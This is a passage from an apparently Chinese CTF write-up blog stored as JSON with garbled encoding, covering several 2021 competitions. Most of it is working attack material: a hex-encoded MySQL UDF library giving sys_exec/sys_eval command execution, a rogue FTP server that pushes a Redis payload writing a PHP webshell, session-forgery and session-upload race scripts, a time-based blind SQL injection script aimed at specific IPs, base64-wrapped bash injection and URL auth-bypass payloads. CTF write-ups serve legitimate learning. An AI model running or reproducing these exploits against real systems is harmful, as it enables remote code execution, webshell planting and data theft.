00000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400') into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb18/plugin/mysqludf.so'; ç„¶åå†ä»é‡Œé¢å¯¼å…¥å‡½æ•° create function sys_eval returns string soname 'mysqludf.so'; checkin_goæ¯”èµ›çš„æ—¶å€™æœ‰æ‰¾åˆ°ç±»ä¼¼çš„æ–‡ç« ï¼Œä½†æ˜¯ç”±äºgoè¯­è¨€ç¬¬ä¸€æ¬¡è§ï¼Œå½“æ—¶ç¡®å®æœ‰ç‚¹æ…Œäº†ï¼Œå“å¯æƒœå‘€~å…³é”®ç‚¹åœ¨è¿™é‡Œ:chekNowMoneyè¿™ä¸ªå€¼æˆ‘ä»¬ä»ä»£ç é‡Œå¯ä»¥çœ‹åˆ°æ˜¯cookiesä¸€å®šæœ‰çš„ å¹¶ä¸”è¿™ä¸ªå€¼å°±æ˜¯åŠ å¯†å20wçš„å€¼ ä¹‹åçŒœæµ‹å¯èƒ½æ˜¯sessionsä¼ªé€  ä½†è¿™ä¸ªæ˜¯éšæœºç”Ÿæˆçš„ æŸ¥äº†ç›¸å…³èµ„æ–™å‘ç° goé‡Œé¢çš„math/seed å¦‚æœæ²¡è®¾å®š é»˜è®¤ä¸º1 é»˜è®¤ç§å­ä¸º1è¿™å°±ä»£è¡¨ç€æˆ‘ä»¬éšæœºæ•°å¯æ§ï¼Œé‚£æˆ‘ä»¬ä¼ªé€ sessionså°±è¡Œäº† ä¼ªé€ ä¸€ä¸ªé’±æ•°å’Œç®¡ç†å‘˜ã€‚è„šæœ¬: å‚è€ƒé“¾æ¥https://annevi.cn/2020/08/14/wmctf2020-gogogowriteup/#0x04_SSRF_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96package mainimport (&quot;github.com/gin-contrib/sessions&quot;&quot;github.com/gin-contrib/sessions/cookie&quot;&quot;github.com/gin-gonic/gin&quot;&quot;math/rand&quot;&quot;fmt&quot;)func main() {r := gin.Default()storage := cookie.NewStore(randomChar(16))r.Use(sessions.Sessions(&quot;o&quot;, storage))r.GET(&quot;/getcookies&quot;,cookieHandler)r.Run(&quot;0.0.0.0:8002&quot;)}func cookieHandler(c *gin.Context){s := sessions.Default(c)s.Set(&quot;uname&quot;, &quot;admin&quot;)s.Set(&quot;checkNowMoney&quot;, &quot;JkeLNs0tAng7rDdgtr1nDQ&quot;)s.Set(&quot;checkPlayerMoney&quot;, &quot;JkeLNs0tAng7rDdgtr1nDQ&quot;)s.Set(&quot;nowMoney&quot;, 200000)s.Set(&quot;playerMoney&quot;, 200000)s.Save()}func randomChar(l int) []byte {output := make([]byte, l)rand.Read(output)return output} cross the sideæ˜¯ssrfæ‰“redisçš„é¢˜ç›®ï¼Œå¯æƒœäº†ï¼Œæ²¡æœ‰å»åšä¸€ä¸‹ï¼Œå› ä¸ºæ˜¯åˆšå­¦åˆ°çš„çŸ¥è¯†ç‚¹ï¼Œå¯¹ç€ä¹‹å‰çš„ç¬”è®°çœ‹çœ‹åˆ«äººçš„é¢˜è§£å§:gopheræ‰“redisï¼Œä½†æ˜¯åé¢çš„è¿æ¥å…¶å®æˆ‘æ˜¯æ²¡æ‡‚çš„å…ˆæ‹¿ä¸ªé¢˜è§£å¥½äº† import socketfrom urllib.parse import unquote# å¯¹gopherusç”Ÿæˆçš„payloadè¿›è¡Œä¸€æ¬¡urldecodepayload =unquote(&quot;%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2429%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/%2A%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2420%0D%0A/var/www/html/public%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A&quot;)payload = payload.encode('utf-8')host = '0.0.0.0'port = 23sk = socket.socket()sk.bind((host, port))sk.listen(5)# ftpè¢«åŠ¨æ¨¡å¼çš„passvie port,ç›‘å¬åˆ°1234sk2 = socket.socket()sk2.bind((host, 1234))sk2.listen()# è®¡æ•°å™¨ï¼Œç”¨äºåŒºåˆ†æ˜¯ç¬¬å‡ æ¬¡ftpè¿æ¥count = 1while 1:conn, address = sk.accept()conn.send(b&quot;200 \\n&quot;)print(conn.recv(20)) # USER aaa\\r\\n å®¢æˆ·ç«¯ä¼ æ¥ç”¨æˆ·åif count == 1:conn.send(b&quot;220 ready\\n&quot;)else:conn.send(b&quot;200 ready\\n&quot;)print(conn.recv(20)) # TYPE I\\r\\n å®¢æˆ·ç«¯å‘Šè¯‰æœåŠ¡ç«¯ä»¥ä»€ä¹ˆæ ¼å¼ä¼ è¾“æ•°æ®ï¼ŒTYPEIè¡¨ç¤ºäºŒè¿›åˆ¶ï¼Œ TYPE Aè¡¨ç¤ºæ–‡æœ¬if count == 1:conn.send(b&quot;215 \\n&quot;)else:conn.send(b&quot;200 \\n&quot;)print(conn.recv(20)) # SIZE /123\\r\\n å®¢æˆ·ç«¯è¯¢é—®æ–‡ä»¶/123çš„å¤§å°if count == 1:conn.send(b&quot;213 3 \\n&quot;)else:conn.send(b&quot;300 \\n&quot;)print(conn.recv(20)) # EPSV\\r\\n'conn.send(b&quot;200 \\n&quot;)print(conn.recv(20)) # PASV\\r\\n å®¢æˆ·ç«¯å‘Šè¯‰æœåŠ¡ç«¯è¿›å…¥è¢«åŠ¨è¿æ¥æ¨¡å¼if count == 1:# 36.255.221.156conn.send(b&quot;227 36,255,221,156,4,210\\n&quot;) # æœåŠ¡ç«¯å‘Šè¯‰å®¢æˆ·ç«¯éœ€è¦åˆ°å“ªä¸ªip:portå»è·å–æ•°æ®,ip,portéƒ½æ˜¯ç”¨é€—å·éš”å¼€ï¼Œå…¶ä¸­ç«¯å£çš„è®¡ç®—è§„åˆ™ä¸ºï¼š4*256+210=1234else:print(&quot;ç¬¬äºŒæ¬¡&quot;)conn.send(b&quot;227 127,0,0,1,0,6379\\n&quot;) # ç«¯å£è®¡ç®—è§„åˆ™ï¼š35*256+40=9000print(conn.recv(20)) # ç¬¬ä¸€æ¬¡è¿æ¥ä¼šæ”¶åˆ°å‘½ä»¤RETR /123\\r\\nï¼Œç¬¬äºŒæ¬¡è¿æ¥ä¼šæ”¶åˆ°STOR /123\\r\\nif count == 1:conn.send(b&quot;125 \\n&quot;) # å‘Šè¯‰å®¢æˆ·ç«¯å¯ä»¥å¼€å§‹æ•°æ®è¿æ¥äº†# æ–°å»ºä¸€ä¸ªsocketç»™æœåŠ¡ç«¯è¿”å›æˆ‘ä»¬çš„payloadprint(&quot;å»ºç«‹è¿æ¥!&quot;)conn2, address2 = sk2.accept()conn2.send(payload)conn2.close()print(&quot;æ–­å¼€è¿æ¥!&quot;)else:conn.send(b&quot;150 \\n&quot;)print(conn.recv(20))exit()# ç¬¬ä¸€æ¬¡è¿æ¥æ˜¯ä¸‹è½½æ–‡ä»¶ï¼Œéœ€è¦å‘Šè¯‰å®¢æˆ·ç«¯ä¸‹è½½å·²ç»ç»“æŸif count == 1:conn.send(b&quot;226 \\n&quot;)conn.close()count += 1 å‚è€ƒé“¾æ¥ï¼šhttps://mp.weixin.qq.com/s?__biz=MzIzMTQ4NzE2Ng==&amp;mid=2247491162&amp;idx=1&amp;sn=273d86b4c5c4f8758face216497bd87d&amp;chksm=e8a23d8bdfd5b49dd9ea82601cc7683f9debeb91d9cda100230cc25d76d801ab58a5d1443a34&amp;mpshare=1&amp;scene=23&amp;srcid=09125Gbtvppmn5dEsykPwidl&amp;sharer_sharetime=1631456612674&amp;sharer_shareid=1a55b3791775cccd32c32b318eb9206a#rd","link":"/2021/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFwp/"},{"title":"2021ç¬¬äº”ç©ºé—´å¤§èµ›","text":"å‰è¨€æ¯”èµ›çš„æ—¶å€™ä¸€ç›´çº ç»“é‚£é¢˜sqlæ³¨å…¥ï¼Œåé¢èµ›åå¤ç°å…¶ä»–é¢˜ç›®æ‚”ä¸å½“åˆï¼Œé¢˜ç›®éƒ½ä¸ä¼šå¤ªéš¾å§ pklovecloud&lt;?php include 'flag.php';class pkshow { function echo_name() { return &quot;Pk very safe^.^&quot;; } } class acp { protected $cinder; public $neutron; public $nova; function __construct() { $this-&gt;cinder = new pkshow; } function __toString() { if (isset($this-&gt;cinder)) return $this-&gt;cinder-&gt;echo_name(); } } class ace{ public $filename; public $openstack; public $docker; function echo_name() { $this-&gt;openstack = unserialize($this-&gt;docker); $this-&gt;openstack-&gt;neutron = $heat; if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova) { $file = &quot;./{$this-&gt;filename}&quot;; if (file_get_contents($file)) { return file_get_contents($file); } else { return &quot;keystone lost~&quot;; } } } } if (isset($_GET['pks'])) { $logData = unserialize($_GET['pks']); echo $logData; } else { highlight_file(__file__); }?&gt; æ„é€ ä¸€ä¸‹é“¾æ¡ &lt;?phpclass acp{ public $cinder; public $neutron=&quot;1&quot;; public $nova=&quot;1&quot;; function __construct() { $this-&gt;cinder = new pkshow; } function __toString() { if (isset($this-&gt;cinder)) return $this-&gt;cinder-&gt;echo_name(); }}class ace{ public $filename; public $openstack; public $docker; function echo_name() { $this-&gt;openstack = unserialize($this-&gt;docker); $this-&gt;openstack-&gt;neutron = $heat; if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova) { $file = &quot;./{$this-&gt;filename}&quot;; if (file_get_contents($file)) { return file_get_contents($file); } else { return &quot;keystone lost~&quot;; } } }}$a=new acp();$b=new ace();$b-&gt;filename=&quot;flag.php&quot;;$a-&gt;cinder=$b;echo urlencode(serialize($a)); O%3A3%3A&quot;acp&quot;%3A3%3A%7Bs%3A6%3A&quot;cinder&quot;%3BO%3A3%3A&quot;ace&quot;%3A3%3A%7Bs%3A8%3A&quot;filename&quot;%3Bs%3A8%3A&quot;flag.php&quot;%3Bs%3A9%3A&quot;openstack&quot;%3BN%3Bs%3A6%3A&quot;docker&quot;%3BN%3B%7Ds%3A7%3A&quot;neutron&quot;%3Bs%3A1%3A&quot;1&quot;%3Bs%3A4%3A&quot;nova&quot;%3Bs%3A1%3A&quot;1&quot;%3B%7D WebFTPç›®å½•æ‰«æï¼Œæ‹¿åˆ°æºç ï¼Œç„¶åä½¿ç”¨index.phpé‡Œé¢çš„æ–‡ä»¶è¿›è¡Œç™»å½•ï¼Œå‘ç°æŠ¥é”™ï¼Œä¸çŸ¥é“æœ‰æ²¡æœ‰ç”¨ï¼Œå…ˆæ”¶é›†ä¸€ä¸‹ Warning: error_log(/var/www/html/Data/Logs/21_09_17.log): failed to open stream: No such file or directory in /var/www/html/Inc/Functions.php on line 229 å‘ç°éƒ½æ²¡å•¥ç”¨ï¼Œä½†æ˜¯å‘ç°å¯ä»¥ä¸‹è½½é…ç½®æ–‡ä»¶ï¼Œäºæ˜¯å°±å¯¹ç…§æ‹¿åˆ°çš„æºç å»ç¿»ç¿»çœ‹ http://114.115.185.167:32770/Readme/mytz.php?act=phpinfo å‘ç°å¯ä»¥æ‰§è¡Œphpinfoï¼Œæ¥ä¸‹æ¥å°±æ‹¿åˆ°flagäº† EasyCleanup &lt;?phpif(!isset($_GET['mode'])){ highlight_file(__file__);}else if($_GET['mode'] == &quot;eval&quot;){ $shell = $_GET['shell'] ?? 'phpinfo();'; if(strlen($shell) &gt; 15 | filter($shell) | checkNums($shell)) exit(&quot;hacker&quot;); eval($shell);}if(isset($_GET['file'])){ if(strlen($_GET['file']) &gt; 15 | filter($_GET['file'])) exit(&quot;hacker&quot;); include $_GET['file'];}function filter($var): bool{ $banned = [&quot;while&quot;, &quot;for&quot;, &quot;\\$_&quot;, &quot;include&quot;, &quot;env&quot;, &quot;require&quot;, &quot;?&quot;, &quot;:&quot;, &quot;^&quot;, &quot;+&quot;, &quot;-&quot;, &quot;%&quot;, &quot;*&quot;, &quot;`&quot;]; foreach($banned as $ban){ if(strstr($var, $ban)) return True; } return False;}function checkNums($var): bool{ $alphanum = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'; $cnt = 0; for($i = 0; $i &lt; strlen($alphanum); $i++){ for($j = 0; $j &lt; strlen($var); $j++){ if($var[$j] == $alphanum[$i]){ $cnt += 1; if($cnt &gt; 8) return True; } } } return False;}?&gt; æŸ¥çœ‹ä¸€ä¸‹phpinfo()å†…å®¹ ?mode=eval&amp;shell=phpinfo(); åˆšåˆšæ³¨æ„åˆ°æœ‰æ–‡ä»¶åŒ…å«æ“ä½œ,å‘ç°sessionè¿™é‡Œå¼€å¯äº†ï¼Œ ç„¶åå†™è„šæœ¬åŒ…å«ä»¥ä¸‹å°±å‡ºæ¥äº†~ import requestsimport threadingsess_id=&quot;1&quot;s=requests.session()url=&quot;http://114.115.134.72:32770/&quot;def session_upload(): while True: res= s.post( url=f&quot;{url}/?page=/tmp/session/sess_{sess_id}&quot;, data={ 'PHP_SESSION_UPLOAD_PROGRESS': &quot;&lt;?php system('ls');?&gt;&quot; }, files={&quot;file&quot;: ('xxx.txt', open(&quot;shell.txt&quot;, &quot;r&quot;))}, cookies={'PHPSESSID':sess_id} )for i in range(100): thread=threading.Thread(target=session_upload) thread.start() yet_another_mysql_injectionæœ€åä¸€é¢˜ï¼Œä¸€å¼€å§‹çœ‹äº†ä¸€ä¸‹æºç ï¼Œè¦ç™»å½• &lt;?phpinclude_once(&quot;lib.php&quot;);function alertMes($mes,$url){ die(&quot;&lt;script&gt;alert('{$mes}');location.href='{$url}';&lt;/script&gt;&quot;);}function checkSql($s) { if(preg_match(&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\\\\$|0x|sleep|\\ /i&quot;,$s)){ alertMes('hacker', 'index.php'); }}if (isset($_POST['username']) &amp;&amp; $_POST['username'] != '' &amp;&amp; isset($_POST['password']) &amp;&amp; $_POST['password'] != '') { $username=$_POST['username']; $password=$_POST['password']; if ($username !== 'admin') { alertMes('only admin can login', 'index.php'); } checkSql($password); $sql=&quot;SELECT password FROM users WHERE username='admin' and password='$password';&quot;; $user_result=mysqli_query($con,$sql); $row = mysqli_fetch_array($user_result); if (!$row) { alertMes(&quot;something wrong&quot;,'index.php'); } if ($row['password'] === $password) { die($FLAG); } else { alertMes(&quot;wrong password&quot;,'index.php'); }}if(isset($_GET['source'])){ show_source(__FILE__); die;}?&gt; ä¸€å¼€å§‹çœ‹äº†ä¸€ä¸‹ä»¥ä¸ºæ˜¯è¦ç™»å½•ï¼Œæ‰€ä»¥å°±å†™äº†ä¸ªè„šæœ¬ç›²æ³¨ import requestsimport timeimport binasciiurl=&quot;http://114.115.143.25:32770&quot;s=requests.session()def hex_tran(s): return hex(s).replace(&quot;0x&quot;, &quot;&quot;)def tran_str(g): tran_tmp=&quot;&quot; g = binascii.unhexlify(g) print(g.decode('utf-8')) tran_tmp=g print(tran_tmp[::-1]) return tran_tmpdef sql_injection(payload:str): wd_tr=&quot;&quot; for j in range(1,100): for i in range(32,128): #payload_fina=f&quot;1'or/**/case/**/(select/**/hex(right(({payload}),{j}))/**/in/**/('{hex_tran(i)+wd_tr}'))/**/when/**/1/**/then/**/benchmark(100000,sha1(sha1(sha1(sha1(sha1(sha1(sha1('HWG'))))))))/**/else/**/1/**/end#&quot; payload_fina =f&quot;1'or/**/case/**/(select/**/ascii(mid(({payload}),{j},1)))/**/when/**/({i})/**/then/**/benchmark(1000000,sha1(sha1(sha1(sha1(sha1(sha1(sha1(sha1(sha1(sha1('HWG')))))))))))/**/else/**/1/**/end#&quot; data={ &quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:payload_fina } print(data) times=time.time() r=s.post(url,data=data).text print(r) if time.time()-times &gt;= 7: wd_tr+=chr(i) print(wd_tr) break if i==127: print(wd_tr) exit(0)if __name__ ==&quot;__main__&quot;: payload=&quot;version()&quot; #payload=&quot;database()&quot; #payload=&quot;select group_concat(table_name) from information_schema.tables where table_schema in (select database())&quot;.replace(&quot; &quot;,&quot;/**/&quot;) #payload=&quot;select group_concat(table_name) from sys.schema_table_statistics&quot;.replace(&quot; &quot;,&quot;/**/&quot;) #payload=&quot;select group_concat(a.2) from (select 1,2,3 union select * from `users`)a&quot;.replace(&quot; &quot;,&quot;/**/&quot;) #payload=&quot;select group_concat(column_name) from information_schema.columns where table_name in ('Fl49ish3re')&quot;.replace(&quot; &quot;,&quot;/**/&quot;) #payload=&quot;select group_concat(f1aG123) from Fl49ish3re&quot;.replace(&quot; &quot;,&quot;/**/&quot;) sql_injection(payload) æ³¨å‡ºæ¥ä»¥åï¼Œå‘ç°æ•°æ®åº“æ˜¯ç©ºçš„ï¼Œå¡äº†å¾ˆä¹…ï¼Œåæ¥æ‰æƒ³åˆ°ï¼Œæ•°æ®åº“ä¸ºç©ºï¼Œåˆè¦è®©æˆ‘ä»¬è¾“å…¥çš„å†…å®¹å’Œè¾“å‡ºçš„å†…å®¹ä¸€è‡´çš„è¯ï¼Œå°±éœ€è¦è‡ªå·±æ„é€ ä¸€ä¸‹ '/**/UNION/**/SELECT/**/REPLACE(REPLACE('&quot;/**/UNION/**/SELECT/**/REPLACE(REPLACE(&quot;^&quot;,unhex(hex(34)),unhex(hex(39))),unhex(hex(94)),&quot;^&quot;)#',unhex(hex(34)),unhex(hex(39))),unhex(hex(94)),'&quot;/**/UNION/**/SELECT/**/REPLACE(REPLACE(&quot;^&quot;,unhex(hex(34)),unhex(hex(39))),unhex(hex(94)),&quot;^&quot;)#')# å¤§å¸ˆå‚…è·Ÿæˆ‘è¯´ï¼Œé‡åˆ°è¿™ç§é¢˜ç›®ï¼Œå…¶å®å¯ä»¥è¿™æ ·å°è¯•ä¸€æ³¢ï¼šåœ¨åé¢æ³¨å…¥password like â€œ%â€ å› ä¸ºå¦‚æœæ•°æ®åº“æœ‰æ•°æ®ï¼Œé‚£ä¹ˆä»»ä½•æ•°æ®like %éƒ½æ˜¯æ»¡è¶³çš„ï¼Œå¦‚æœä¾ç„¶è¿”å›falseï¼Œè¯´æ˜æ•°æ®åº“æ˜¯ç©ºçš„å½“ç„¶é¦–å…ˆæ˜¯ä½ çš„ç”¨æˆ·åæ˜¯æ­£ç¡®çš„ pngè½¬æ¢å™¨çœ‹äº†ä¸€ä¸‹æ¡†æ¶æ˜¯rubyï¼Œè¿™ä¸ªæ—¶å€™åº”è¯¥ç”¨æ’é™¤æ³•ï¼Œè‚¯å®šä¸æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œå› ä¸ºæ— æ³•è®¿é—®åˆ°å›¾ç‰‡ï¼Œæ¥ä¸‹å°±æ˜¯convert png fileçš„æ¡†ï¼Œè¿™é‡Œåˆæœ‰ä»€ä¹ˆæƒ…å†µå¯èƒ½å‘¢ï¼Ÿsstiæ³¨å…¥ï¼Œå‘½ä»¤æ‰§è¡Œï¼Œä¼¼ä¹ä¹Ÿæ— äº†ï¼Œsstiæ³¨å…¥æ²¡åœ°æ–¹å›æ˜¾ï¼Œæ‰€ä»¥è‚¯å®šä¹Ÿä¸æ˜¯ï¼Œè¿™é‡Œå°±å­¦åˆ°ä¸€ä¸ªæ–°å§¿åŠ¿ file=|bash -c &quot;$(echo 'bHMgLw==' | base64 -d)&quot; #.pngcat /FLA9_KywXAv78LbopbpBDuWsmfile=|bash -c &quot;$(echo 'Y2F0IC9GTEE5X0t5d1hBdjc4TGJvcGJwQkR1V3Nt' | base64 -d)&quot; #.png è¿™ä¸ªå°±æ˜¯rubyå‘½ä»¤æ‰§è¡Œçš„å§¿åŠ¿äº†ï¼Œå°†å‘½ä»¤æ‰§è¡Œçš„ç»“æœä»¥base64çš„æ–¹å¼å­˜å‚¨åœ¨pngä¸­","link":"/2021/09/17/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E5%A4%A7%E8%B5%9B/"},{"title":"2021Rctf","text":"å½“æ—¶åœ¨æ‰“ç¾ŠåŸæ¯ï¼Œæ‰“å®Œä»¥åå°±å¾ˆç´¯å°±æ²¡æ€ä¹ˆæ‰“rctfï¼Œä¸è¿‡é¢˜ç›®ä¹Ÿæ˜¯æˆ‘æ²¡è§è¿‡çš„trickå°±æ˜¯äº†ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ easyphpåˆ†å·å‰æ®µè®¤è¯ç»•è¿‡åŸç†1.httpservletrequestä¸­urlè§£æå‡½æ•°å‡ ç§è§£ææ–¹æ³•ï¼š request.getRequestURL()ï¼šè¿”å›å…¨è·¯å¾„ï¼›request.getRequestURI()ï¼šè¿”å›é™¤å»Hostï¼ˆåŸŸåæˆ–IPï¼‰éƒ¨åˆ†çš„è·¯å¾„ï¼›request.getContextPath()ï¼šè¿”å›å·¥ç¨‹åéƒ¨åˆ†ï¼Œè‹¥æ˜¯å·¥ç¨‹æ˜ å°„ä¸º/ï¼Œåˆ™è¿”å›ä¸ºç©ºï¼›request.getServletPath()ï¼šè¿”å›é™¤å»Hostå’Œå·¥ç¨‹åéƒ¨åˆ†çš„è·¯å¾„ï¼›request.getPathInfo()ï¼šä»…è¿”å›ä¼ é€’åˆ°Servletçš„è·¯å¾„ï¼Œè‹¥æ˜¯æ²¡æœ‰ä¼ é€’é¢å¤–çš„è·¯å¾„ä¿¡æ¯ï¼Œåˆ™æ­¤è¿”å›Nullï¼› å½“åå°ç¨‹åºä½¿ç”¨getRequestURI()æˆ–getRequestURL()å‡½æ•°æ¥è§£æç”¨æˆ·è¯·æ±‚çš„URLæ—¶ï¼Œè‹¥URLä¸­åŒ…å«äº†ä¸€äº›ç‰¹æ®Šç¬¦å·ï¼Œåˆ™å¯èƒ½ä¼šå½¢æˆè®¿é—®é™åˆ¶ç»•è¿‡çš„å®‰å…¨é£é™©ï¼Œå…¶ä¸­åˆ†å·ï¼›å°±æ˜¯å…¶ä¸€ã€‚ 2.å¯¹urlç‰¹æ®Šå­—ç¬¦çš„å¤„ç†1ï¼‰åˆ†å·åœ¨urlä¸­é‡åˆ°åˆ†å·ï¼Œä¼šå°†;xxx/ä¸­çš„åˆ†å·ä¸æ–œæ ä¹‹é—´çš„å­—ç¬¦ä¸²ä»¥åŠåˆ†å·è‡ªå·±éƒ½å»æ‰2ï¼‰æ–œæ /åˆ¤æ–­æ˜¯å¦æœ‰è¿ç»­çš„/ï¼Œå­˜åœ¨çš„è¯åˆ™å¾ªç¯åˆ é™¤æ‰å¤šä½™çš„/3ï¼‰./å’Œ../å°†/./åˆ é™¤æ‰ï¼Œå°†/../è¿›è¡Œè·¨ç›®å½•æ‹¼æ¥å¤„ç† æ€»ç»“ï¼š/;xxx/å®ç°åˆ†å‰²ç›®å½•/..;/å®ç°è·¨ç›®å½•ï¼Œç»å¸¸ä½¿ç”¨åœ¨../è¢«ç¦ç”¨çš„åœºæ™¯ä¸‹;.cssæˆ–;.jsç­‰åˆ©ç”¨ç™½åå•ç»•è¿‡è®¤è¯é‰´æƒ payloadï¼š åŠ /ç»•è¿‡ï¼šhttp://localhost:8080//urltest/info/secret.jspè·¨ç›®å½•ï¼šhttp://localhost:8080/urltest/anything/../info/secret.jsp æˆ–http://localhost:8080/urltest/anything/..;/info/secret.jsp./ç»•è¿‡ï¼šhttp://localhost:8080/urltest/./info/secret.jsp;ç»•è¿‡ï¼šhttp://localhost:8080/urltest/;anything/info/secret.jsp é¢˜ç›®è§£æçœ‹äº†ä¸€ä¸‹å¤§ç¥ä»¬çš„è§£é‡Šï¼Œæ‰å‘ç°è¿™é¢˜æœ‰å¤šéº»çƒ¦ï¼Œæ 